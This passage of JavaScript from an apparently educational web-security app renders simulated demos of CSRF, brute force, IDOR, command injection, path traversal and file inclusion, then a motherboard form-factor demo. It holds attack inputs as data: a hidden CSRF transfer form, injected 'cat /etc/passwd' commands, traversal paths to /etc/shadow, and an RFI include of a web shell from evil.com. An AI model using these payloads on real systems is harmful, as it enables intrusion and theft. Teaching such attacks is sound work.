                                <div class="bank-actions">
                                    <button class="demo-btn demo-btn-sm" id="csrfTransferBtn">Transfer Funds</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">📡 HTTP Requests</div>
                        <div class="demo-sql-code" id="csrfLog"><pre>Session: authenticated as Alice\nCookie: session=abc123xyz</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="csrfExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Alice is logged into her bank. Her browser has a valid session cookie.</p>
                    </div>
                </div>
            </div>`;

        const url = $('#csrfUrl'), contentArea = $('#csrfContent'), logBox = $('#csrfLog');
        const explanationText = pane.querySelector('.explanation-text');
        const balanceEl = $('#csrfBalance');

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const step = b.dataset.step;

                if (step === '1') {
                    url.textContent = 'https://bank.example.com/dashboard';
                    contentArea.innerHTML = `
                        <div class="demo-bank-ui">
                            <div class="bank-header"><span>🏦 SecureBank</span><span class="bank-user">Welcome, Alice</span></div>
                            <div class="bank-balance"><strong>Balance:</strong> $5,000.00</div>
                        </div>`;
                    logBox.innerHTML = `<pre>Session: authenticated as Alice\nCookie: session=abc123xyz</pre>`;
                    explanationText.innerHTML = '<p><strong>Step 1:</strong> Alice is logged into her bank. Her browser has a valid session cookie that\'s automatically sent with every request to bank.example.com.</p>';
                } else if (step === '2') {
                    url.textContent = 'https://evil.com/free-prize.html';
                    contentArea.innerHTML = `
                        <div style="padding:20px;text-align:center">
                            <h4>🎉 You Won a Free iPhone!</h4>
                            <p style="font-size:0.85rem;color:var(--text-muted);margin:8px 0">Click below to claim your prize</p>
                            <button class="demo-btn" id="csrfClaimBtn">Claim Prize</button>
                            <p style="font-size:0.7rem;color:var(--text-muted);margin-top:16px">Hidden in page source:</p>
                            <pre style="background:#1a202c;color:#e2e8f0;padding:10px;border-radius:6px;font-size:0.7rem;text-align:left;margin-top:4px">&lt;form action="bank.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="attacker"&gt;
  &lt;input type="hidden" name="amount" value="4999"&gt;
&lt;/form&gt;</pre>
                        </div>`;
                    logBox.innerHTML = `<pre>Browsing: evil.com/free-prize.html\n\n⚠ Page contains hidden form targeting bank.com\n⚠ Clicking will trigger auto-submit</pre>`;
                    explanationText.innerHTML = '<p><strong>Step 2:</strong> Alice visits a malicious page. It contains a hidden form that targets her bank. If she clicks anything (or via auto-submit), the browser sends the request WITH her bank cookies automatically attached.</p>';
                    const claimBtn = $('#csrfClaimBtn');
                    if (claimBtn) claimBtn.onclick = () => {
                        $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                        $$('.demo-step-btn')[2].classList.add('active');
                        showStep3();
                    };
                } else {
                    showStep3();
                }

                function showStep3() {
                    url.textContent = 'https://bank.example.com/dashboard';
                    contentArea.innerHTML = `
                        <div class="demo-bank-ui">
                            <div class="bank-header"><span>🏦 SecureBank</span><span class="bank-user">Welcome, Alice</span></div>
                            <div class="bank-balance" style="color:#e53e3e"><strong>Balance:</strong> $1.00</div>
                            <div class="demo-log" style="color:#e53e3e;font-size:0.8rem">
                                ⚠ Transaction: -$4,999.00 to account "attacker_account"<br>
                                Timestamp: ${new Date().toISOString()}
                            </div>
                        </div>`;
                    logBox.innerHTML = `<pre>POST /transfer HTTP/1.1
Host: bank.example.com
Cookie: session=abc123xyz  ← Auto-attached!
Content-Type: application/x-www-form-urlencoded

to=attacker_account&amount=4999

→ 200 OK: Transfer successful
→ Alice's balance: $1.00</pre>`;
                    explanationText.innerHTML = '<p><strong>Step 3 – Result:</strong> The transfer was executed using Alice\'s authenticated session. She never intended to make this transfer. The server couldn\'t distinguish this from a legitimate request because it had valid session cookies.</p>';
                }
            };
        });
    }

    /* -- Broken Auth Demo -- */
    function demoBrokenAuth(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Broken Authentication – Brute Force</span>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://app.example.com/login</span>
                        </div>
                        <div class="browser-content">
                            <div class="demo-login-form">
                                <h4>🔐 AppLogin</h4>
                                <p class="demo-subtitle">No rate limiting • No lockout</p>
                                <div class="demo-field"><label>Username</label><input class="demo-input" id="baUser" value="admin"></div>
                                <div class="demo-field"><label>Password</label><input class="demo-input" id="baPass" value=""></div>
                                <button class="demo-btn" style="width:100%;margin-top:8px" id="baBruteBtn">🔨 Start Brute Force</button>
                                <div class="demo-status" id="baStatus"></div>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel">
                        <div class="panel-header">📡 Attack Log</div>
                        <div class="demo-sql-code" id="baLog" style="max-height:300px;overflow-y:auto"><pre>Ready to start brute force attack…</pre></div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>This demo simulates a brute-force attack against a login form with no rate limiting. The attacker tries common passwords until finding the correct one. Without account lockout or CAPTCHA, there's nothing to stop them.</p>
                    </div>
                </div>
            </div>`;

        const passwords = ['123456', 'password', 'admin', 'letmein', 'welcome', 'monkey', 'master', 'qwerty', 'admin123', 'P@ssw0rd!'];
        const log = $('#baLog');
        let running = false;

        $('#baBruteBtn').onclick = () => {
            if (running) return;
            running = true;
            log.innerHTML = '<pre>Starting brute force attack on user "admin"…\n</pre>';
            const pre = log.querySelector('pre');
            let i = 0;
            const interval = setInterval(() => {
                const pw = passwords[i];
                const isCorrect = i === passwords.length - 1;
                pre.textContent += `\nAttempt ${i + 1}: admin / ${pw} → ${isCorrect ? '✅ SUCCESS!' : '❌ Failed'}`;
                log.scrollTop = log.scrollHeight;

                if (isCorrect) {
                    clearInterval(interval);
                    running = false;
                    const status = $('#baStatus');
                    status.className = 'demo-status show warning';
                    status.innerHTML = `⚠️ Password cracked after ${i + 1} attempts: <strong>${pw}</strong>`;
                    $('#baPass').value = pw;
                    pre.textContent += `\n\n🔓 Account compromised!\nNo rate limiting detected.\nNo account lockout detected.\nNo CAPTCHA required.`;
                }
                i++;
            }, 400);
        };
    }

    /* -- IDOR Demo -- */
    function demoIDOR(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Insecure Direct Object Reference – Profile Access</span>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1.5">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="idorUrl">https://api.example.com/users/1001/profile</span>
                        </div>
                        <div class="browser-content demo-api-explorer">
                            <div style="display:flex;gap:8px;margin-bottom:16px">
                                <span style="background:#48bb78;color:white;padding:4px 12px;border-radius:4px;font-size:0.75rem;font-weight:700">GET</span>
                                <input class="demo-input" id="idorInput" value="/api/users/1001/profile" style="flex:1;font-family:var(--font-mono);font-size:0.82rem">
                                <button class="demo-btn demo-btn-sm" id="idorSendBtn">Send</button>
                            </div>
                            <div id="idorProfile"></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">📊 API Response</div>
                        <div class="demo-sql-code" id="idorResponse"><pre>// Send a request to see the response</pre></div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>Try changing the user ID in the URL from <code>1001</code> to <code>1002</code> or <code>1003</code>. The API doesn't verify that you're authorized to access other users' profiles – a classic IDOR vulnerability.</p>
                    </div>
                </div>
            </div>`;

        const profiles = {
            '1001': { name: 'You (John Doe)', email: 'john@example.com', role: 'User', ssn: '***-**-1234', avatar: '👤' },
            '1002': { name: 'Jane Smith (Admin)', email: 'jane@company.com', role: 'Administrator', ssn: '555-12-9876', avatar: '👩‍💼' },
            '1003': { name: 'Bob Wilson (CEO)', email: 'bob@company.com', role: 'Executive', ssn: '123-45-6789', avatar: '👨‍💼', salary: '$450,000' },
        };

        function render() {
            const path = $('#idorInput').value;
            const match = path.match(/\/users\/(\d+)/);
            const id = match ? match[1] : null;
            const p = id ? profiles[id] : null;
            const urlEl = $('#idorUrl');
            const profile = $('#idorProfile');
            const response = $('#idorResponse');

            urlEl.textContent = `https://api.example.com${path}`;

            if (!p) {
                response.innerHTML = `<pre>HTTP 404 Not Found\n{\n  "error": "User not found"\n}</pre>`;
                profile.innerHTML = '';
                return;
            }

            const isOwn = id === '1001';
            profile.innerHTML = `
                <div class="profile-card">
                    <div class="profile-avatar">${p.avatar}</div>
                    <h4>${p.name}</h4>
                    <div class="profile-detail">${p.role}</div>
                    <div class="profile-detail">${p.email}</div>
                    <div class="profile-detail">SSN: ${p.ssn}</div>
                    ${p.salary ? `<div class="profile-detail">Salary: ${p.salary}</div>` : ''}
                    ${!isOwn ? '<div class="demo-status show warning" style="margin-top:12px;font-size:0.78rem">⚠️ Accessing another user\'s private data!</div>' : ''}
                </div>`;

            response.innerHTML = `<pre>HTTP 200 OK ${!isOwn ? '← ⚠ No authorization check!' : ''}\n{\n  "id": ${id},\n  "name": "${p.name.split(' (')[0]}",\n  "email": "${p.email}",\n  "role": "${p.role}",\n  "ssn": "${p.ssn}"${p.salary ? `,\n  "salary": "${p.salary}"` : ''}\n}</pre>`;
        }

        $('#idorSendBtn').onclick = render;
        render();
    }

    /* -- Command Injection Demo -- */
    function demoCmdInjection(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Command Injection – Network Diagnostic Tool</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Use</button>
                    <button class="demo-step-btn" data-step="2">2. Inject Command</button>
                    <button class="demo-step-btn" data-step="3">3. Read Files</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://tools.example.com/netdiag</span>
                        </div>
                        <div class="browser-content">
                            <h4 style="margin-bottom:4px">🌐 Network Diagnostic</h4>
                            <p class="demo-subtitle">Enter a hostname to ping</p>
                            <div style="display:flex;gap:8px">
                                <input class="demo-input" id="cmdiInput" value="8.8.8.8" style="flex:1;font-family:var(--font-mono)">
                                <button class="demo-btn" id="cmdiRunBtn">Run Ping</button>
                            </div>
                            <div class="cmdi-output" id="cmdiOutput"><pre>Results will appear here…</pre></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">⚙️ Server-Side Execution</div>
                        <div class="demo-sql-code" id="cmdiServer"><pre>// Waiting…</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="cmdiExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Normal usage – ping a hostname. The server runs <code>ping -c 4 &lt;input&gt;</code>.</p>
                    </div>
                </div>
            </div>`;

        const input = $('#cmdiInput'), output = $('#cmdiOutput'), server = $('#cmdiServer');
        const explanationText = pane.querySelector('.explanation-text');

        const responses = {
            '8.8.8.8': 'PING 8.8.8.8: 56 data bytes\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=117 time=12.3 ms\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=11.8 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=12.1 ms\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss',
        };

        function run() {
            const val = input.value;
            server.innerHTML = `<pre>// Server-side code (vulnerable):\nString cmd = "ping -c 4 " + userInput;\nRuntime.exec(cmd);\n\n// Actual command executed:\n$ ping -c 4 ${esc(val)}</pre>`;

            if (responses[val]) {
                output.innerHTML = `<pre>${responses[val]}</pre>`;
            } else if (val.includes(';') || val.includes('|') || val.includes('&&')) {
                const parts = val.split(/[;|&]+/).map((s) => s.trim());
                let out = '';
                parts.forEach((p) => {
                    if (p.match(/^[\d.]+$/)) out += `PING ${p}: 64 bytes, ttl=117, time=12ms\n`;
                    else if (p.includes('whoami')) out += 'www-data\n';
                    else if (p.includes('id')) out += 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n';
                    else if (p.includes('cat /etc/passwd')) out += 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n';
                    else if (p.includes('ls')) out += 'index.php\nconfig.php\nuploads/\ndb_backup.sql\n';
                    else out += `${p}: command output\n`;
                });
                output.innerHTML = `<pre>${esc(out)}</pre>`;
            } else {
                output.innerHTML = `<pre>PING ${esc(val)}: 56 data bytes\n64 bytes: icmp_seq=0 ttl=117 time=15.2 ms\n3 packets transmitted, 3 received</pre>`;
            }
        }

        $('#cmdiRunBtn').onclick = run;

        const steps = {
            '1': { val: '8.8.8.8', text: '<p><strong>Step 1:</strong> Normal usage – the tool pings a valid IP address. The command executes safely.</p>' },
            '2': { val: '8.8.8.8; whoami; id', text: '<p><strong>Step 2:</strong> By adding <code>;</code> after the IP address, the attacker chains additional commands. The server reveals the running user and permissions.</p>' },
            '3': { val: '8.8.8.8; cat /etc/passwd', text: '<p><strong>Step 3:</strong> The attacker reads sensitive system files. With command injection, they have full shell access on the server.</p>' },
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
                input.value = s.val;
                explanationText.innerHTML = s.text;
            };
        });
    }

    /* -- Path Traversal Demo -- */
    function demoPathTraversal(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Path Traversal – File Access</span>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1.5">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="pathUrl">https://docs.example.com/view?file=report.pdf</span>
                        </div>
                        <div class="browser-content">
                            <h4 style="margin-bottom:8px">📁 Document Viewer</h4>
                            <div style="display:flex;gap:8px;margin-bottom:12px">
                                <input class="demo-input" id="pathInput" value="report.pdf" style="flex:1;font-family:var(--font-mono)">
                                <button class="demo-btn demo-btn-sm" id="pathFetchBtn">View File</button>
                            </div>
                            <div class="file-list" style="margin-bottom:12px">
                                <div class="file-item" data-f="report.pdf">📄 report.pdf</div>
                                <div class="file-item" data-f="invoice.pdf">📄 invoice.pdf</div>
                                <div class="file-item" data-f="../../../etc/passwd">🔓 ../../../etc/passwd</div>
                                <div class="file-item" data-f="../../../etc/shadow">🔓 ../../../etc/shadow</div>
                                <div class="file-item" data-f="../../config/database.yml">🔓 ../../config/database.yml</div>
                            </div>
                            <div id="pathContent" style="background:#f7fafc;border-radius:6px;padding:14px;font-family:var(--font-mono);font-size:0.8rem;min-height:80px;white-space:pre-wrap"></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">⚙️ Server Processing</div>
                        <div class="demo-sql-code" id="pathServer"><pre>// Click a file to view</pre></div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>The server reads files using <code>basePath + userInput</code> without validating the path. By using <code>../</code> sequences, an attacker can escape the document directory and read any file the web server can access.</p>
                    </div>
                </div>
            </div>`;

        const files = {
            'report.pdf': 'ANNUAL REPORT 2024\n==================\nRevenue: $12.5M\nEmployees: 150\nCustomer Satisfaction: 94%',
            'invoice.pdf': 'INVOICE #10234\n==============\nClient: ACME Corp\nAmount: $5,200.00\nDue: 2024-02-01',
            '../../../etc/passwd': '⚠️ SENSITIVE FILE ACCESSED!\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\npostgres:x:26:26:PostgreSQL:/var/lib/pgsql:/bin/bash',
            '../../../etc/shadow': '⚠️ CRITICAL FILE!\n\nroot:$6$xyz$hashhashhash...:19000:0:99999:7:::\nwww-data:!:19000:0:99999:7:::',
            '../../config/database.yml': '⚠️ DATABASE CREDENTIALS!\n\nproduction:\n  adapter: mysql2\n  host: db.internal\n  database: production_db\n  username: prod_admin\n  password: Sup3rS3cr3t!@#',
        };

        function load(f) {
            $('#pathInput').value = f;
            $('#pathUrl').textContent = `https://docs.example.com/view?file=${f}`;
            $('#pathContent').textContent = files[f] || 'File not found.';
            const isMalicious = f.includes('..');
            $('#pathServer').innerHTML = `<pre>// Server code (vulnerable):\nString path = "/var/www/docs/" + request.getParam("file");\n\n// Resolved path:\n${isMalicious ? '⚠ ' : ''}${f.includes('..') ? '/var/www/docs/' + f + '\n→ Resolves to: ' + f.replace(/\.\.\//g, '').replace(/^/, '/') : '/var/www/docs/' + f}\n\n${isMalicious ? '⚠ PATH TRAVERSAL DETECTED!\nAttacker escaped the /var/www/docs/ directory!' : '✅ Normal file access within allowed directory'}</pre>`;
        }

        $$('.file-item').forEach((fi) => fi.onclick = () => load(fi.dataset.f));
        $('#pathFetchBtn').onclick = () => load($('#pathInput').value);
        load('report.pdf');
    }

    /* -- Security Misconfiguration Demo -- */
    function demoMisconfig(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-warning">⚠ CHECK</span>
                    <span class="demo-title">Security Misconfiguration Scanner</span>
                </div>
                <div class="demo-visual" style="flex-direction:column">
                    <div class="demo-browser" style="width:100%">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">Security Configuration Audit</span>
                        </div>
                        <div class="browser-content">
                            <div style="display:flex;gap:8px;margin-bottom:16px">
                                <input class="demo-input" id="misconfigUrl" value="https://vulnerable-app.example.com" style="flex:1">
                                <button class="demo-btn" id="misconfigScanBtn">🔍 Run Scan</button>
                            </div>
                            <div class="misconfig-checks" id="misconfigResults"></div>
                        </div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>This scanner checks for common security misconfigurations. Red items are vulnerabilities that could be exploited. Click "Run Scan" to see the results.</p>
                    </div>
                </div>
            </div>`;

        const checks = [
            { name: 'HTTPS Enforcement', pass: true, detail: 'HSTS header present' },
            { name: 'Default Credentials', pass: false, detail: 'admin/admin works on /admin panel!' },
            { name: 'Directory Listing', pass: false, detail: '/uploads/ directory is browsable' },
            { name: 'Server Version Header', pass: false, detail: 'Server: Apache/2.4.49 (known vulnerabilities)' },
            { name: 'Error Messages', pass: false, detail: 'Stack traces visible: java.sql.SQLException at…' },
            { name: 'X-Frame-Options', pass: false, detail: 'Missing – vulnerable to clickjacking' },
            { name: 'Content-Security-Policy', pass: false, detail: 'Missing – vulnerable to XSS' },
            { name: 'X-Content-Type-Options', pass: true, detail: 'nosniff set correctly' },
            { name: 'Debug Mode', pass: false, detail: '/debug/console is accessible!' },
            { name: 'Backup Files', pass: false, detail: 'Found: /config.php.bak, /db_backup.sql' },
        ];

        $('#misconfigScanBtn').onclick = () => {
            const results = $('#misconfigResults');
            results.innerHTML = '';
            let i = 0;
            const interval = setInterval(() => {
                if (i >= checks.length) { clearInterval(interval); return; }
                const c = checks[i];
                const div = el('div', `check-item ${c.pass ? 'pass' : 'fail'}`);
                div.innerHTML = `<span class="check-icon">${c.pass ? '✅' : '❌'}</span><span style="flex:1"><strong>${c.name}</strong><br><span style="font-size:0.78rem;color:var(--text-muted)">${c.detail}</span></span>`;
                div.style.animation = 'fadeIn 0.3s ease';
                results.appendChild(div);
                i++;
            }, 300);
        };
    }

    /* ============================================================
       FILE INCLUSION DEMO
       ============================================================ */
    function demoFileInclusion(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">File Inclusion – LFI & RFI</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Include</button>
                    <button class="demo-step-btn" data-step="2">2. Local File Inclusion</button>
                    <button class="demo-step-btn" data-step="3">3. Remote File Inclusion</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1.3">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="fiUrl">https://app.example.com/view?page=about.php</span>
                        </div>
                        <div class="browser-content">
                            <h4 style="margin-bottom:8px">📄 Page Viewer</h4>
                            <div style="display:flex;gap:8px;margin-bottom:12px">
                                <span style="background:#edf2f7;padding:6px 10px;border-radius:4px;font-size:0.75rem;color:var(--text-muted);white-space:nowrap">?page=</span>
                                <input class="demo-input" id="fiInput" value="about.php" style="flex:1;font-family:var(--font-mono);font-size:0.82rem">
                                <button class="demo-btn demo-btn-sm" id="fiLoadBtn">Load</button>
                            </div>
                            <div id="fiPageContent" style="background:#f7fafc;border-radius:6px;padding:16px;font-size:0.85rem;min-height:120px;white-space:pre-wrap;line-height:1.6"></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">⚙️ Server-Side Code</div>
                        <div class="demo-sql-code" id="fiServer"><pre>// PHP include (vulnerable):
include($_GET['page']);

// Loaded: about.php
// ✅ Normal — within allowed directory</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="fiExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Normal page load. The application includes a local PHP file as expected.</p>
                    </div>
                </div>
            </div>`;

        const pages = {
            'about.php': '<h4>About Us</h4><p>Welcome to our application. We provide secure services for our customers.</p><p>Founded in 2020. Trusted by thousands.</p>',
            'contact.php': '<h4>Contact</h4><p>Email: info@example.com</p><p>Phone: +1-555-0123</p>',
            '../../../../etc/passwd': '⚠️ SENSITIVE FILE ACCESSED!\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\npostgres:x:26:26:PostgreSQL:/var/lib/pgsql:/bin/bash\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin',
            '../../../../var/log/apache2/access.log': '⚠️ WEB SERVER LOG ACCESSED!\n\n192.168.1.100 - - [01/Jan/2025:10:00:00] "GET /admin HTTP/1.1" 200 1234\n192.168.1.105 - - [01/Jan/2025:10:01:15] "POST /login HTTP/1.1" 302 0\n10.0.0.50 - admin [01/Jan/2025:10:02:30] "GET /config.php HTTP/1.1" 200 567\n\n⚠ Log poisoning possible: inject PHP code via User-Agent header!',
            'https://evil.com/shell.php': '⚠️ REMOTE CODE EXECUTION!\n\n[evil.com/shell.php loaded and executed!]\n\n$ whoami\nwww-data\n\n$ id\nuid=33(www-data) gid=33(www-data)\n\n$ cat /var/www/config.php\ndb_host = "localhost"\ndb_user = "admin"\ndb_pass = "S3cr3tP@ss!"',
        };

        const input = $('#fiInput');
        const pageContent = $('#fiPageContent');
        const server = $('#fiServer');
        const urlBar = $('#fiUrl');
        const explanationText = pane.querySelector('.explanation-text');

        function loadPage(val) {
            urlBar.textContent = `https://app.example.com/view?page=${val}`;
            const isTraversal = val.includes('..');
            const isRemote = val.startsWith('http');
            const content = pages[val];

            if (content) {
                pageContent.innerHTML = content;
            } else {
                pageContent.textContent = isRemote ? '⚠️ Remote file inclusion attempted!' : isTraversal ? '⚠️ Local file inclusion attempted!' : 'Page not found.';
            }

            if (isRemote) {
                server.innerHTML = `<pre>// PHP include (vulnerable):
include($_GET['page']);

// Loaded: ${esc(val)}
// ⚠ REMOTE FILE INCLUSION!
// The server fetched and EXECUTED
// code from an external server!
//
// allow_url_include = On (dangerous!)
// Attacker has full code execution!</pre>`;
            } else if (isTraversal) {
                server.innerHTML = `<pre>// PHP include (vulnerable):
include($_GET['page']);

// Requested: ${esc(val)}
// Resolved: /var/www/html/${esc(val)}
// → ${val.replace(/\.\.\//g, '').replace(/^/, '/')}
//
// ⚠ LOCAL FILE INCLUSION!
// Attacker escaped /var/www/html/
// and accessed system files!</pre>`;
            } else {
                server.innerHTML = `<pre>// PHP include (vulnerable):
include($_GET['page']);

// Loaded: ${esc(val)}
// ✅ Normal — within allowed directory</pre>`;
            }
        }

        pageContent.innerHTML = pages['about.php'];
        $('#fiLoadBtn').onclick = () => loadPage(input.value);

        const steps = {
            '1': { val: 'about.php', text: '<p><strong>Step 1:</strong> Normal page inclusion. The application loads a legitimate local file.</p>' },
            '2': { val: '../../../../etc/passwd', text: '<p><strong>Step 2 — LFI Attack:</strong> Using <code>../</code> sequences, the attacker traverses out of the web root to read sensitive system files. The server includes <code>/etc/passwd</code> which reveals all system user accounts.</p>' },
            '3': { val: 'https://evil.com/shell.php', text: '<p><strong>Step 3 — RFI Attack:</strong> If <code>allow_url_include</code> is enabled in PHP, the attacker can include a remote file. The server fetches and <strong>executes</strong> the attacker\'s PHP code, giving them a web shell with full server access.</p>' },
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
                input.value = s.val;
                explanationText.innerHTML = s.text;
                loadPage(s.val);
            };
        });
    }


    /* ============================================================
       C1: MOTHERBOARD DEMO
       ============================================================ */
    function demoBoardSize(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">\u{1f527} INTERACTIVE</span><span class="demo-title">Motherboard Form Factors</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center" id="boardBtns"><button class="demo-btn demo-btn-sm active" data-ff="eatx">E-ATX</button><button class="demo-btn demo-btn-sm" data-ff="atx">ATX</button><button class="demo-btn demo-btn-sm" data-ff="matx">Micro-ATX</button><button class="demo-btn demo-btn-sm" data-ff="itx">Mini-ITX</button></div><div style="display:flex;gap:24px;align-items:center;justify-content:center"><div id="boardVisual" style="background:linear-gradient(135deg,#2d5016,#3a6b1e);border:3px solid #8B7355;border-radius:8px;position:relative;transition:all 0.4s ease;display:flex;align-items:center;justify-content:center;color:#a0d060;font-family:monospace;font-size:0.7rem;text-align:center;width:280px;height:280px"><div>CPU Socket<br>RAM Slots: 8<br>PCIe x16: 4<br>SATA: 10</div></div><div id="boardInfo" style="min-width:200px;font-size:0.85rem;line-height:1.8"><div><strong>E-ATX (Extended ATX)</strong></div><div>Size: 305x330 mm</div><div>8 RAM Slots, 4+ PCIe x16</div><div>10 SATA ports</div><div>Use: Servers, Workstations</div></div></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>The form factor determines the physical size of the motherboard, which dictates case compatibility, number of expansion slots, and overall system capabilities.</p></div></div></div>';
        var specs = {
            eatx: { w:280,h:280,ram:8,pcie:4,sata:10,name:'E-ATX (Extended ATX)',size:'305x330 mm',use:'Servers, Workstations'},
            atx: { w:240,h:260,ram:4,pcie:3,sata:6,name:'ATX (Standard)',size:'305x244 mm',use:'Desktop PCs'},
            matx: { w:200,h:200,ram:4,pcie:2,sata:4,name:'Micro-ATX',size:'244x244 mm',use:'Budget Builds'},
            itx: { w:150,h:150,ram:2,pcie:1,sata:2,name:'Mini-ITX',size:'170x170 mm',use:'Compact HTPCs'}
        };
        $$('#boardBtns .demo-btn').forEach(function(b) {
            b.onclick = function() {
                $$('#boardBtns .demo-btn').forEach(function(x){x.classList.remove('active');});
                b.classList.add('active');
                var s = specs[b.dataset.ff];
                var v = $('#boardVisual');
                v.style.width = s.w+'px'; v.style.height = s.h+'px';
                v.innerHTML = '<div>CPU Socket<br>RAM Slots: '+s.ram+'<br>PCIe x16: '+s.pcie+'<br>SATA: '+s.sata+'</div>';
                $('#boardInfo').innerHTML = '<div><strong>'+s.name+'</strong></div><div>Size: '+s.size+'</div><div>'+s.ram+' RAM Slots, '+s.pcie+' PCIe x16</div><div>'+s.sata+' SATA ports</div><div>Use: '+s.use+'</div>';
            };
        });
    }

    /* ============================================================
       C1: CPU DEMO
       ============================================================ */
    function demoCPU(pane) {
